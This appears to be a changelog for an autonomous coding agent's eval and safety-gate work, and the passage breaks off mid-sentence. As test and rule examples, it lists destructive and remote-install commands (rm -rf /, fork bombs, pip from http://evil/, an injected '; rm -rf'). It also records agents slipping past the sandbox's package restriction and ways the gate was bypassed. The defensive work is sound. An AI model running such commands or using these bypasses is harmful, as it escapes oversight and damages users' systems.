# Eval changelog

One row per tuning cycle: hypothesis, change, before, after, kept or reverted.
**One change per cycle** — two changes and the delta cannot be attributed.

---

## FR-606: attach to a running task (2026-09-25)

**Not a tuning cycle**, and no eval: the worker path is on no split. Verified by
hand against a real run, because this project has already shipped a capability
with seven passing tests that was unusable.

A task id IS a thread id, so `--resume` already reopened a FINISHED task. What
was missing was watching one still going, and `run_once` passed a plain list as
`trace` and threw it away.

**Read-only, and that is the design rather than a limitation.** A worker runs
autonomous, where `confirm` degrades to `deny` (FR-304), so no human is being
asked anything while it runs - there is nothing for a watcher to answer. Taking
over interactively would need a cooperative-stop protocol between two processes
and would make `autonomous` a value that changes mid-run, which the gate reads.

**The mechanism was already in the codebase.** `cli.LiveTrace` is a list
subclass whose `append` renders, precisely so that graph.py needs no callback
and no streaming API. `worker.EventLog` is the same trick pointed at SQLite:
every node already reports through `trace.append`, so nothing in the graph
learns that a store exists, and a caller passing its own list - the harness -
keeps getting exactly that.

- `migrations.py` v5: `task_events(task_id, seq, at, kind, payload)`. The plan
  asked for an index on `(task_id, seq)`; the composite PRIMARY KEY IS that
  index in SQLite, so a second one would be dead weight.
- **seq is 1-based**, which is not cosmetic: at 0-based, `after=0` - the only
  sensible starting point for a reader - never returns the first entry. The
  mutation that makes it 0-based turns 6 tests red.
- A write failure is swallowed, like the rest of the worker's bookkeeping. A
  task that did the work must not be reported failed because its own log broke.
- `conclude()` sweeps events of tasks finished more than 7 days ago. A trace is
  ~100 rows a task - the live run recorded **139** - so unbounded is not an
  option.
- `/api/tasks/<id>/trace` goes through the SAME `redact()` chokepoint as every
  other route, because a trace carries tool output. An empty id is a 404, which
  a test caught: `/api/tasks//trace` was being served 200.

**Live check.** `--submit`, `--worker` in the background, `--attach` in the
foreground: it printed 11 turns with the tool line per call, returned on its own
when the task went terminal, and the store held 139 events across nine kinds
afterwards. The viewer route served them as 15,544 chars of JSON. `--attach` on
an unknown id prints to stderr and exits 1.

I read a zero first and it was my own error, not the code: a bare `python -c`
does not load `.env` - only the entry point does (CE-05) - so I was reading
`~/.noesis` while the CLI wrote `D:/agent-state`.

`--submit` now says `watch it with: python -m agent --attach <id>` rather than
pointing at `--tasks`, which only ever showed a status.

**No schema cost** - this is a CLI flag and a table, not a tool the model sees.
1,224 -> 1,240 tests. Three mutations: drop the swallow and a locked store fails
the task; make seq 0-based and 6 tests go red; remove `redact` from the
chokepoint and 3 go red, two of which were already guarding it.

## FR-205: git as a tool - REVERTED (2026-09-25)

**It was called 0 times in 161 calls.** The guard was clean and the tool earned
nothing, so it is gone.

**Hypothesis**: `run_shell` can already run git, so the point was the
DESCRIPTION - prompt text the model reads at runtime, measured load-bearing here
(`edit_file`'s wording took real repositories 0/9 -> 4/7).

**Change**: one `@tool(risk="write")` named `git`, a single `args` string, run
with **no shell** (`shlex.split` -> `["git", *parts]`), so quoting was not the
model's problem and `;`/`&&` chained nothing. Two deviations from the plan, both
deliberate: no separate `operation` parameter, because `@tool` derives no enum
from a signature and `shell=False` removes the injection a whitelist would have
guarded; and `run_shell`'s body was extracted into a shared `_capture(command,
seconds, shell)` rather than duplicating 25 lines, which §13 forbids.

**The gate half was the interesting part.** The three git rules in `DANGER` were
written against a SHELL command and look for the literal word `git`, so a tool
taking only the part after it is invisible to them. `EXECUTES` now maps a tool to
`(argument, prefix)` - `{"git": ("args", "git ")}` - which is data in the
declaration table, not a name special-case in `classify()`. With it,
`git push --force`, `reset --hard` and `clean -fdx` all escalate through the new
tool exactly as through a shell.

**Bar, pre-registered, and it had to be restated first.** The plan said "dev
15/15, tools 9/9, revert if neither moves" - which is arithmetic nonsense,
because both splits are AT ceiling and cannot move up. The same mistake as Phase
R's 11/11. Restated before measuring: (1) dev holds at 15/15, a fall reverts;
(2) `git` is called at least once.

**Result**: dev **14/14 scored, 1 blocked** at `MAX_TURNS=30`, zero tamper, zero
write violations, 1.17M tokens. `off-by-one` run 1 reached the 30-turn cap,
ended `stuck`, and passed anyway. The guard is clean. `git` was called **0 times
in 161 calls**.

**Why the zero is not a verdict on the tool, and why it reverts anyway.** No dev
fixture is a git repository and no goal in any split mentions git, so
`git status` would have returned `fatal: not a git repository`. The zero measures
the FIXTURES' silence. But nothing measured shows the tool buying anything, and
775 chars of schema is rent on every turn of every run on a provider that caches
nothing - `search_files` is the precedent already paid for, a tool duplicating
`run_shell`'s reach used 70 times in 8,820 calls. Keeping this on "it seems
right" is what the discipline exists to stop.

**The eval design was wrong and I should have caught it before writing the bar.**
I checked the three `tools` goals for git and did not check whether any workspace
was a repository. Measuring FR-205 needs a fixture that REQUIRES git - a repo
whose bug was introduced in a known commit, findable from the history - because
a task requirement binds where advice about a tool does not.

**Two things measured on the way that OUTLIVE the revert:**

- **The schema budget is far tighter than the plan assumed.** 6,349 is the
  BUILT-INS only; the live toolset in a scored run, with memory and MCP, reads
  **7,650 before this tool and 8,427 after**. Real headroom is **1,573 of
  10,000**, not ~3,650. Cycle 5's browser server has to fit four tools into
  that and probably cannot.
- **`--continue` never resumed anything.** It sorted run directories by NAME and
  took the last, so `control-20260922-e65d94b` beat every `2026...` timestamp
  (`c` > `2`) and it resumed the real-repo control, then refused it for
  describing a different run. One morning's resume produced 0 rows after 5
  preflight probes. Now sorted by each manifest's own `started`, with the mtime
  as fallback. KEPT - it is a rig fix, not an agent change, and it is what made
  the rest of this measurement possible. 2 tests.

1,232 tests while it existed; 1,224 after the revert, which is 1,222 plus the
rig fix. Both halves were mutation-checked before the revert: drop the `git `
prefix and `push --force` runs at `auto`; run it through a shell and
`status; rm -rf keep.txt` deletes the file.

## FR-204: where a package comes from (2026-09-24)

**Hypothesis**: `pip install --index-url http://evil/ x` was `auto`, so arbitrary
code from an arbitrary host executed with no pause. Escalating the SOURCE, and
only the source, closes that without touching the ordinary case.

This is not FR-204 as written. §8.2 resolved that on 2026-08-31 - packages are
baked at build time, and a scored container has no-index, a read-only root and
an allowlisted egress. The hole is in INTERACTIVE use, where the gate is the
whole boundary and nothing else stops a redirected index.

**Change**: one named rule in `DANGER`, so the reason reads `run_shell is
destructive (a package from an unvetted source)`. It fires on `--index-url`,
`--extra-index-url`, `--find-links`, `--trusted-host`, `--registry`, `-i`, a
`http(s)`/`git+`/`file`/`ssh` URL, a `.whl`/`.tar.gz`/`.tgz` archive, or
`PIP_CONFIG_FILE=`. `pip`, `uv pip`, `npm`, `pnpm`, `yarn`.

**Narrow on purpose.** `missing-dep` is SOLVED by the agent running
`pip install -r requirements.txt`, and a blanket `confirm` becomes `deny` in
autonomous mode, so a wide rule fails a case that passes today. 58 of the 92
package-manager commands in 7,290 recorded executions are that one command.

**Replayed before shipping**, the way the hardline tier was: 7,369 recorded
executions, **6 escalated, every one genuine** - four `--index-url` at real
PyPI and two replacing `PIP_CONFIG_FILE`, all of them an agent trying to get
out of the sandbox's no-index. Zero of the 79 executions in the 18 rows
measured today.

**I got the first version wrong, and the measurement did not catch it.** It had
a clause for a bare local path, which matches every FLAG that takes one:
`pip install -r ./requirements.txt`, `-r /app/requirements.txt` and
`--target /tmp/libs` were all denied. `missing-dep` scored 3/3 only because the
model wrote `requirements.txt` with no path prefix in all three runs - a seed
that writes `./requirements.txt` fails the case. Found by probing near-miss
forms by hand AFTER the split came back clean. The clause is gone; a local
directory grants nothing `run_shell` does not already have in a writable
workspace, and an archive is still caught.

**Before/after**: dev **13/15**, and that number is not the bar - I launched
without `AGENT_MAX_TURNS=30`, so the fixture's own `max_turns: 12` bound. Four
cases went 12/12 at that TIGHTER cap; `add-endpoint` scored 1/3 with turns
[12, 13, 12], against 0/3 documented at cap 12. Re-run at the baseline's cap,
`add-endpoint` is **3/3** (`done` x3, turns 18/15/18, zero tamper), and the
composite is **15/15** - assembled from two passes, not one 15-row pass, and
recorded that way.

`missing-dep` **3/3**, with `pip install -r requirements.txt` classified `auto`
in all three runs. The rule fired **0 times in 210 calls across 18 rows**; the
6 non-`auto` verdicts in those rows are hallucinated tool names (`finish`,
`ls`), nothing to do with it.

**Kept.** Schema budget unchanged at **5,572 of 10,000** - a policy rule is not
a tool and costs nothing per turn. 1,193 -> 1,222 tests. Two mutations: widen
the source clause to any `install` and 14 tests go red; put the bare-path
clause back and the 5 new params go red.

## FR-307: correcting a call at the approval point (2026-09-24)

**Not a tuning cycle.** An interface, and a branch of the gate that had been
written and never tested.

The gate pauses on `rm -rf build` and the only answers were yes and no. Denying
costs a turn and hopes the model proposes something safer next time. `[e]dit` in
the CLI and Amend in the TUI hand back the corrected arguments instead.

`gate` already accepted `{"decision": "amend", "input": {...}}` and
re-classified it - written on 2026-08-something with a comment claiming
"RE-CLASSIFIED, never waved through", and **no test anywhere asserted it**.
Both halves are covered now, end to end: an amendment that edits a path to
escape the workspace is still denied, and one that turns `rm -rf build` into
`ls build` runs `ls build` - asserted on what actually executed, not on the
verdict.

One prompt per argument, in order, Enter keeping the current value - the whole
set is editable for the same reason FR-306 shows the whole set unabbreviated. A
changed value arrives as a string and the tool coerces it at its own boundary,
which is where every declared type is enforced anyway. EOF mid-edit is `deny`:
silence is not consent one step later either.

**Not remembered.** `[s]` keys on the rule the gate named, and that rule
described the arguments the amendment replaces.

In the TUI the fields are hidden until Amend is pressed, and that same button
becomes Apply - a second button would sit there doing nothing until armed.

No schema cost, and no eval: scored runs are autonomous, where `confirm`
degrades to `deny` and no human is asked. 1,186 -> 1,193 tests. Both new
branches mutation-checked: drop the `decision` key from the CLI answer and two
tests go red; remove the gate's re-classification and the escape test goes red.

## The Phase R replacement, measured: revision 3/3, and the first attempt scored 0/1 (2026-09-24)

**KEPT.** The bar was `revision` 3/3 against the 1/3 control, guards `skills`
18/18 and `authoring` 11/11, pre-registered before either ran.

```
revision   3/3   done x3       (control arm 1/3)
skills    18/18  every case 3/3, 0 tamper
authoring 11/12  against 10/12 on 09-13, +1 (author-testname 2/3 -> 3/3)
```

Verified in the FILES, which is the standard this project holds R to: in all
three `revision` runs session 4 opened **`runbook`**, the library held BOTH
skills, and `conventions` still carried `-slate`. Nothing was overwritten -
the whole difference from the mechanism this replaces.

### The first attempt scored 0/1 and the diagnosis was wrong

Shipped: `best_match` breaks a tie by recency. Row 0 failed `stuck`, session 4
opened **nothing**, and the tie branch was never reached. Reproduced against
the library that run actually wrote:

```
library: ['conventions', 'runbook']
best_match("Cut release 2.3.") -> None
ceiling 1
  conventions  overlap ['release']  rare []
  runbook      overlap ['release']  rare []
```

At two skills the furniture ceiling is `len(entries) // 2` = 1, and `release`
is in both descriptions, so it is dropped and `scores` comes back EMPTY. The
old tie test's own docstring says this - "with two, the word is dropped as
furniture and the function returns None before the tie branch is ever
reached" - and it was read, a six-skill test was written around it, and the
real two-skill library was never tried. The run was stopped at row 0 rather
than spend two more rows proving it three times.

The deeper point: the goal is "Cut release 2.3." and the two descriptions
differ only in `conventions`/CONVENTIONS.md against `runbook`/RUNBOOK.md,
neither of which is in the goal. **No word-overlap rule can separate them.**
Recency is the only available signal, and it has to apply where the ranking
has no opinion, not only where it ties.

So: when no skill has a rare overlap, fall back to plain overlap and let
recency decide - on words of four letters or more, because `the`, `and` and
`work` appear in every description `_when()` writes and a three-letter floor
would match any goal carrying one. Both halves mutation-checked: remove the
fallback and the fixture test is red; loosen the floor to three and the
stopword test is red.

### Two confounds, recorded rather than smoothed over

**The `authoring` bar was arithmetic nonsense.** 11/11 was copied from this
repository's own State table; the split is 4 cases x 3 = **12 rows**, and the
recorded guard is 10/12 from 09-13. 11/12 is +1 against the number it should
always have been measured against. The State table is corrected.

**Budgets were removed one commit earlier**, and it shows: `stuck` is 8 of 12
verdicts in `authoring` and 4 of 18 in `skills`, where these splits used to
end `done`. `author-errors[1]`, the single loss, is one of them - the right
skill was written and injected in both later sessions, and session 3 ran to
the 12-turn cap with the check unmet. So the retrieval change did not break
the guards, and the +1 cannot be attributed to it. Two changes, one delta,
which is the confound the one-change rule exists to prevent.

1,184 -> 1,186 tests.

## Phase R deleted: the defect was in retrieval, not in correction (2026-09-23)

**A cycle, pre-registered and NOT yet measured** - the code and the paperwork
are here; the three splits run when there is quota.

### What R was, and why it went

A skill open when a run ended `stuck`/`budget` (or on a 3-failure streak) was
marked suspect in `memory.skill_failures`; the next run that ended `done`
overwrote its body with the closest document read. The trigger is a judgement
and the judgement was wrong, measured: **R marked on 7 runs and 6 of them
PASSED**. It has been off by default since 2026-09-13 and has never run in real
use. Removing the token budget the same week weakened it further - the `budget`
verdict no longer exists.

### The fixture says the correction was never the missing piece

`skill-correction`: session 1 learns `conventions` from CONVENTIONS.md (suffix
`-slate`), session 3 reads RUNBOOK.md (`-zr7k2q`), session 4 must cut a release
from the library alone. With R OFF, extraction already writes `runbook` as a
sibling - **the library ends correct**. The control arm scored 1/3 because
`best_match` returns None when two skills tie, and `conventions` and `runbook`
tie on "Cut release 2.3.", so NOTHING was injected. The bad skill was not
winning; neither was winning.

### What replaced it

- `_read()` carries `written`, the mtime of SKILL.md. No store, no schema - the
  filesystem already records it.
- `best_match()` takes every name at the top score; one skill strictly newer
  wins; equal write times still return None. The amended rule is not arbitrary -
  the newer skill was written from the more recently read document, which is the
  better evidence - and the old comment ("injecting the WRONG skill is worse than
  injecting none") survives in the equal-time branch.
- Deleted: `memory.mark_suspect/is_suspect/clear_suspect`, the reflect trigger,
  the `correcting` branch and `_closest` in `skills.extract`, `config.SKILL_REVISION`
  and the harness's `revision` field. `skill_failures` is dropped by **migration
  v5** - v4 STAYS, because `apply()` indexes `plan[version:]` by position and
  removing it would renumber every later migration and re-run them.

1,200 -> 1,184 tests, ~280 lines removed. The tie-break is mutation-checked:
restore `return None` and `test_a_tie_goes_to_the_most_recently_written` is red.

### Pre-registered, before the splits run

- **`revision` 3/3** is the bar. The control scored 1/3, the old mechanism 3/3.
  Below 3/3 this is reverted.
- **Guards, both must hold**: `skills` **18/18**, `authoring` **11/11**. A
  recency tie-break changes matching for every library, not just this fixture.
- **Verified in the FILES, not the score**: after session 4 the library holds
  BOTH skills, `conventions` still carries `-slate`, and the trace shows
  `runbook` injected. A pass with `conventions` injected is a pass for the wrong
  reason.

Not in this cycle: refreshing a skill from its own source when that document
changes. That is staleness rather than supersession, it needs provenance stored
per skill, and no fixture measures it.

## No token budget: the cap was ending runs that had already finished the work (2026-09-23)

**Not a tuning cycle, and not measured.** A cap removed, on request, with the
paperwork to say what that costs.

`config.BUDGET_TOKENS` is 0 (no ceiling) and all 66 cases in
`eval/tasks.jsonl` carry `budget: 0`. The verdict still exists and is still a
hard stop when a caller passes a ceiling - `new_state(goal, max_turns,
budget)` is unchanged, and the test that proves a budget terminates a run is
unchanged. What is gone is the default.

### Why

`budget` was the terminal verdict on 6 of 12 rows in the 09-22 control and 9
and 10 of 18 on the two 09-19 passes, and several of those runs had landed
the edit and seen pytest pass before the cap fired - `cachetools[1]` on
09-19 edited at call 22, ran the tests green at 23, and kept going until the
budget stopped it at 27. That is the same shape as the `MAX_SECONDS` finding
of 09-09: a cap sized against runaway runs, ending working ones instead.

The real cases carried 400,000, not the 200,000 in config - the per-case
`budget` field in tasks.jsonl overrides it, which is why every `budget` row
reads 401-417k. Both are now 0.

### What still stops a run

`MAX_TURNS = 30` and `MAX_SECONDS = 1500`, both derived and both measured.
At the ~13.4k tokens per turn these passes recorded, 30 turns is ~400k, so
the turn cap sits roughly where the token cap did: expect `budget` verdicts
to become `stuck` rather than to disappear. That is a prediction, not a
result.

### Against it, and recorded

CLAUDE.md's standing lesson: a budget experiment gave the agent 1M tokens,
it spent 281-516k and made LESS progress. That was a different change - a
raise, with compaction behaving differently - but it is the nearest
measurement and it points the other way. Nothing here refutes it.

NFR-401 amended in writing rather than reinterpreted. **Every number in this
repository was measured under a budget**; the next scored pass is a new
baseline, not a comparison with 9/18.

1,197 -> 1,200 tests: no budget means no `budget` verdict; the TUI's
"running low" warning needs an explicit ceiling; the status line shows bare
spend when there is none.

## The replication: 9/18, the token growth is real, and the loop code is not the cause (2026-09-19)

**Not a tuning cycle.** The pre-registered replication of the morning's
re-baseline, on identical loop code, run `20260919T082521Z`, 18 rows, 0
blocked, 0 tampered. Condition set before launch: median tokens >= 350k and
`budget` >= 8/18 again means the growth is real; if it drops back near 240k
the morning was noise.

### The number

**9/18.** Three 3-run passes on effectively the same code now read 10, 11, 9:
flat, and the spread is the seed. `humanize` 0/3 (the morning's 1/3 was a
seed, as read), `rich` 0/3 again - 0, 1, 0, 0 across four passes, every
loss `budget`. `more-itertools` 3/3, `cachetools` 2/3 (its first loss since
09-03), `click` 1/3, `markdown` 3/3. README and CLAUDE.md quote the LATEST
measured number, 9/18, with the three beside it; quoting the 11 would be
picking the better of three identical runs.

### The condition was met - and the reading of it was wrong

Median **389,942**, `budget` **9/18**. Real, replicated. But the morning's
reading - "passes that do not terminate, so the bucket is `reflect`" - did
not replicate: passes that failed to say `done` were **1 of 9** here against
5 of 11 in the morning. Not `reflect`.

What the two passes agree on, once the two cases that never pass are set
apart from the four that can:

```
                         09-03    09-12    09-19am   09-19pm
four winnable: pass       9/12     7/8      10/12     9/12
their budget verdicts      1        1         4         3
their median tokens      182k     155k      306k      229k
rich + humanize          ~400k, budget, every pass, every time
```

The winnable cases got dearer, in both passes, by more turns spent reading
before the first edit: `cachetools` 142k -> 408k between passes, `click`
at ~380k regardless. Tokens per turn are flat across all four passes
(11.6k, 13.1k, 13.4k, 13.6k); turns are what grew.

### The loop code is identical

The 09-12 pass (155k on the winnable four) ran at `61ba6fb` plus the
then-uncommitted compaction bound and `read_file` floor - that is,
`e65d94b`. `git diff e65d94b..f71efe2` over `agent/graph.py`, `context.py`,
`provider.py`, `tools.py`, `config.py`, `prompts/`, `eval/harness.py` and
`eval/fixtures/real-*` is docstrings and the `SKILL_REVISION` default -
which the harness sets explicitly where measured, and no skill loaded in
any of these runs (`skill_index_chars` 1,224 in all). The gate's new rules
escalated 0 of 409 calls. Nothing in this repository moved the number.

That leaves the endpoint: the same model id serving something that reads
more before it edits. The standing lesson is "caps derived against one
model are a confound when you swap the model" - here nobody swapped it.

### What is recorded, and what is next

- `real` **9/18**; 10, 11, 9 across three 3-run passes; flat.
- median tokens ~390-400k on this endpoint now, against ~240k on 09-12;
  real, replicated, not caused by anything in the tree.
- **Next, before any tuning: the control.** Check out `e65d94b` and run
  `real` on it now. Near 400k rules the repository out outright; near 155k
  means something in the "cosmetic" diff is not. A day of quota. Tuning the
  loop against an endpoint that drifted is the mistake the lessons list
  already paid for once.
- Nothing kept, nothing reverted. No code in this entry.

## The setup wizard: Enter did nothing, and nothing said Tab (2026-09-19)

**Not a tuning cycle.** The TUI's first screen.

Reported on the first real open, with screenshots: the arrows moved the
highlight between models, and that was all anyone could do. Enter on a row
did nothing. Typing did nothing, because the list had focus. The hint said
"^q leaves" and nothing else. The only path to the key box was Tab, then
Tab again to the button - and no line on the screen said so. A wizard whose
one job is to take a key, and the key could not be typed.

Now Enter walks the form: a row -> the key box (or, for the custom row, the
base URL -> the model id -> the key), and Enter in the key box IS the verify
button. The hint reads `up/down choose - enter moves on - verified against
the live endpoint before it is saved - ^q leaves`. Tab still works.

Two pilot tests drive the keys and assert where focus lands and that the
probe receives the typed key; with both handlers removed, both are red.
1,195 -> 1,197 tests.

## The install clones 1 MB, not 29: sparse and partial, with the installer at the root (2026-09-19)

**Not a tuning cycle.** No loop code.

A person installing the agent needs `agent/` (what pip installs) and
`prompts/` (read by path). 1,673 of the 1,746 tracked files are under
`eval/` - six vendored repositories and the fixtures - and a plain clone
downloads all of it. Measured from GitHub: a full clone is **29 MB** on
disk; `--filter=blob:none --sparse` followed by `sparse-checkout set agent
prompts scripts` is **about 1**.

The catch: a `--sparse` clone checks out only the root, so a
`scripts/install.py` is not there to run. Two ways out - the sparse step in
the one-liner, or the installer at the root doing it. The root: the install
line is what people copy from a website, and the moment a fourth directory
is needed, every published copy of a line carrying `sparse-checkout set`
is stale; a file the repository controls is not. So `install.py` moved from
`scripts/` to the root, and the line is

```
git clone --filter=blob:none --sparse https://github.com/notjwp/Noesis.git && cd Noesis && python3 install.py
```

with `;` and `python` on Windows as before. The installer widens the sparse
set only when the checkout IS sparse (`core.sparseCheckout`), so a
developer's full clone is untouched; when it does the clone itself, it
clones the same way. `noesis --update` is `git pull --ff-only` and
`git diff --name-only`, both fine in a sparse partial clone.

Proven: the end-to-end test now builds a repository from a copy of the tree,
clones it `--sparse`, asserts the clone holds only the root, runs
`python3 install.py`, and asserts `agent/` and `prompts/` appeared and
`tests/` did not; by hand on Windows in PowerShell the same way. 1,195
tests, unchanged in count.

## The home defaults to ~/.noesis: the old default was a first-run traceback on macOS and Linux (2026-09-19)

**Not a tuning cycle.** One default, one doctor line.

Found by way of a stray `D:\state` on this machine. `AGENT_HOME` defaulted
to `/state`, which is the container's mount point and right THERE - the
image sets it, the harness passes it. Anywhere else it was a directory
nobody chose: on Windows `Path("/state")` resolves to the current drive's
root, so runs from the days before `.env` was loaded wrote `D:\state`; on
macOS and Linux `/state` is root-owned. Measured as a non-root user with no
`AGENT_HOME`: `noesis --doctor` itself died in `sqlite3.connect` with
`unable to open database file`. The README called the variable optional.
A person who pastes the install line on a Mac and types `noesis` got that.

Now `~/.noesis`, expanded and resolved - per-user, the way every tool's
home is. The image and the harness keep `/state`, explicitly, as they
already did; nothing in a scored run changes. The doctor gains a line,
`ok home <path>` or `FAIL home <path> cannot be created: <ancestor> is not
writable`, checked from the nearest existing ancestor so the check creates
nothing. Same probe re-run: `ok home /tmp/.noesis`, no traceback.

The `_require_workspace` reasoning - no fallback for the WORKSPACE, because a
default that redirects writes to a directory nobody chose hides what it did
- still stands. The home is different: it holds the agent's own memory and
checkpoints, not the user's files, and a per-user default is a choice the
user would recognise. 1,193 -> 1,195 tests.

## The installer in Python, so the one line works on all three hosts (2026-09-19)

**Not a tuning cycle.** No loop code.

`sh scripts/install.sh` worked on macOS, Linux and Git Bash - and nowhere a
Windows person actually types: PowerShell has no `sh` on PATH unless Git for
Windows was installed with a non-default option, and PowerShell 5.1 has no
`&&` at all. The line on the website has to be pasteable into the shell
Windows opens, or it is a line for two hosts with a footnote.

Two ways to get there: a `.ps1` twin of the sh script, ~60 lines each and
two brains to keep in step; or one script in the interpreter all three hosts
share. `scripts/install.py` replaces `install.sh`, same logic, one file:

```
macOS, Linux   git clone ... && cd Noesis && python3 scripts/install.py
Windows        git clone ...; cd Noesis; python scripts/install.py
```

`python` on Windows and `python3` elsewhere for the reason the sh version
found the hard way: a Windows virtualenv has no `python3.exe`, so `python3`
there is the Microsoft Store alias. And the script now HANDS OVER: if
`VIRTUAL_ENV` is set and the interpreter running it is not that venv's, it
re-runs itself under the venv's python before touching anything - the
install lands where the person put themselves, whichever `python` they
typed. Syntax kept to what a 3.8 can parse, so an old interpreter gets the
"needs 3.12" message and not a SyntaxError.

Proven: the end-to-end suite test now runs the documented line
(`python3 scripts/install.py`, venv on PATH); a second test drives the
hand-over with a stand-in venv whose python is a shell script that records
the call; and by hand on Windows in PowerShell - fresh venv, `python
scripts/install.py`, `noesis.exe` written and `--doctor` runs; then the
system Python 3.13 invoked with the venv active, and the line says
`with ...\venv\Scripts\python.exe`. 1,192 -> 1,193 tests.

## The real split at 3 runs: 11/18, flat, and 70% more tokens for no reason found (2026-09-19)

**Not a tuning cycle.** A re-baseline on current code, pre-registered as such:
no change under test, nothing to keep or revert. Run `20260919T033607Z`,
`--split real --runs 3 --pace 20`, 18 rows, 0 blocked, 0 tampered.

### The number

**11/18.** The last 3-run figure was 10/18 on 2026-09-03; the five 2-run
passes since were 7, 7, 8, 8, 8 of 12. Per case:

```
                 09-03   09-12   09-19
cachetools        3/3     2/2     3/3    done, budget, done
markdown          3/3     2/2     3/3    done x3
more-itertools    2/3     2/2     2/3    budget, done, budget
click             2/3     1/2     2/3    stuck, budget, stuck
rich              0/3     1/2     0/3    budget x3
humanize          0/3     0/2     1/3    budget x3
```

The +1 over 10/18 is `humanize[1]`, the first humanize pass on this model
after 0 in eight passes - an edit that landed, tests that went green, and a
`budget` verdict because it never said done. Nothing shipped since 09-12
touches the loop's path on these cases: the gate's new tiers fired on 0 of
409 calls (3 `deny`, all `unknown tool`, same as the 3 of 239 on 09-12),
schema chars are 7,650 in both, no skill loaded in either. It is a good
seed, exactly as `float-division` was on the held-out set, and it is
recorded as flat: **11/18, n=3, level with 10/18.**

`rich` is 0/3 and has now scored 0, 1, 0 across the last three passes with
every loss `budget`. `humanize` 1/3 stays in the set, as decided before the
run: dropping a case that fails would be quoting a number nobody measured.

### The thing that DID move, and is not explained

Median tokens **402,089**, against 241,564 (09-03) and 236,461 (09-12), the
highest of any pass. Ten of eighteen verdicts are `budget`, against 4/18 and
4/12. And five of the eleven passes did not end by `done` - three `budget`,
two `stuck` at the turn cap - against 1 of 10 and 1 of 8 before.

Where it went: **turns**, not tokens per turn. Median turns 17.5 -> 18.5 ->
25.5; tokens per turn 11.6k -> 13.1k -> 13.4k, flat. Median `read_file`
calls per run went from ~7 to ~14. `cachetools[1]` is the shape: 21 calls
before its first edit, ten of them `read_file` on the same `__init__.py`;
the edit at call 22 fixed it, pytest at 23 passed, and it kept going until
the budget stopped it at 27. `more-itertools[0]` edited at 26 and 27, ran
pytest three ways, and hit the cap at 30 with the tests green.

What it is not: not the gate (above), not the schema, not the `read_file`
floor or the compaction bound (both were in the 09-12 pass, the lowest
median of the five), not tool errors (14 in 409 calls against 15 in 239).
Turn latency is unchanged (first token p50 3.1s against 2.8s). That leaves
two candidates this run cannot separate: seed variance at n=3 on a split
whose single-case wall time ranges 1.6 to 18 minutes, and the endpoint
serving something different under the same model id. A free tier gives no
way to check the second. **Hypothesis, not finding.** It becomes a cycle
only if the next pass on unchanged code repeats it - and if it does, the
bucket is "passes that do not terminate", which is `reflect`, not `act`.

### What is recorded

- `real` at 3 runs: **11/18**, flat with 10/18. README and CLAUDE.md say so.
- median tokens 402k, `budget` 10/18, 5 of 11 passes not by `done` - all
  three recorded as observed, none attributed.
- `humanize` 1/3 on this model, in the set.
- Nothing kept, nothing reverted. No code in this entry.

## No sandbox, said out loud - and a gate good enough to be the boundary (2026-09-14)

**Not a tuning cycle.** No loop code; the gate, the interface and the record.

### The gap

NFR-204 says "all execution in a container". The one-line installer ships
`noesis` on the host, where `run_shell` runs on the host, and `docker` appears
nowhere in `agent/`. The container is the harness's. Section 8.2 has recorded
this since 2026-09-08 (FR-302, "the gate IS the boundary"); the README implied
otherwise, `--doctor` said nothing, and NFR-204's own line carried no
amendment. That is the decision this project already made, with the paperwork
finally matching it: native, gate as boundary, container for measurement only.

With no sandbox, the gate's quality is the whole security story, and this
month it was found to miss `python -c` payloads, be walked around by
`run_python`, and false-positive on `*.env`. So three things that make the
trade survivable, each small, each tested and mutation-checked:

**1. A HARDLINE tier above `destructive`.** Until today nothing survived an
"allow": `rm -rf /` was `confirm`, and a person hitting `a` reflexively was
one keystroke from it. Now deleting root or home, writing a block device,
`mkfs`, shutdown/reboot/halt/poweroff at the START of a command, and a fork
bomb are `deny` in every mode, with a reason that says no approval can change
it. Anchored on command start, so `echo reboot` and `grep shutdown log` are
words; `rm -rf build` and `rm -rf /tmp/x` stay `confirm`. Five patterns.

**2. Two categories the regex was missing.** Read-only verbs with a flag that
runs a program - `sort --compress-program`, `rg --pre`, `ag --pager`,
`man -P` - escalate; the verb was never the risk. And an interpreter heredoc
(`python <<EOF`) is inline source with more room, under the same
deletes-only rule as `-c`.

**3. Approvals remembered for the process, by RULE.** `DANGER` is now a list
of (name, pattern) and the reason names which one fired - "run_shell is
destructive (recursive delete)". The CLI gains `[s]ession`, the TUI a third
button, both keyed on (tool, rule): allow `rm -rf build` once and recursive
deletes stop asking, a force-push still does. The memory lives in `cli.py`,
never in `classify()`: FR-305 keeps the gate pure, and a resumable node
re-runs from its first line. Hardline never reaches it - a refusal is not a
question.

Plus one line in `--doctor`: `sandbox none: tools run on this machine; the
policy gate is the boundary`.

### Verified

1,156 -> 1,192 tests. Four mutations, each verified applied: hardline never
fires (17 red), exec-flag rule removed (4 red), memory never consulted (1
red), memory keyed on the tool instead of the rule (1 red).

Blast radius, replayed: **6,886 recorded executions**, 0 refused by hardline,
0 newly escalated. The new tiers touch nothing the agent has ever done. The
scored splits are autonomous, where `confirm` was already `deny`, so the only
behavioural change a scored run could see is a hardline pattern firing on a
command that was already refused - none did.

CONTEXT.md: FR-301, FR-303 and NFR-204 amended in place, pointing at 8.2.
README: what it will not do without asking, what it will not do even if you
say yes, and where it runs. CLAUDE.md's environment line corrected.

---

## The one-line installer (2026-09-14)

**No number to move. A distribution step, and ROADMAP's own reason for
deferring it - "an assistant not yet shown to learn produces support burden,
not information" - was put to the user first: recall and skills extraction are
measured to work, self-correction is off by default. Built on that basis.**

`git clone ... && cd Noesis && sh scripts/install.sh`. A checkout and
not a package, because `noesis update` is `git pull` in the tree and a
`pip install git+...` could not update itself. Not `curl | sh`, because the
policy gate refuses that shape. POSIX sh, since `sh` is dash on Debian and
bash on Git for Windows and it has to be one script.

Three supporting changes:
- `pyproject.toml` declares `[build-system]`; it did not, so pip was guessing
  the backend on every install.
- The image bakes `setuptools==80.9.0`, so a fresh editable install can be
  proven offline in the suite.
- `tests/test_cli.py`: a fresh `--system-site-packages` venv, the script run
  in it, `noesis --doctor` from the result. Green. It had to drop the image's
  `PIP_USER=1` from the environment or the venv branch under test quietly
  performed the user-site branch instead - and `PIP_NO_BUILD_ISOLATION` is
  set to "false", not "1", because pip maps that env var onto the option's
  dest.

**The container test could not have found what the host run found.** The
first version, run on Windows with a fresh venv active, installed into the
Microsoft Store alias's Python and printed "installed. Run: noesis" - because
a Windows venv has no `python3.exe`, so `python3` fell through to the alias,
and `command -v noesis` then found the pre-existing user-site command and
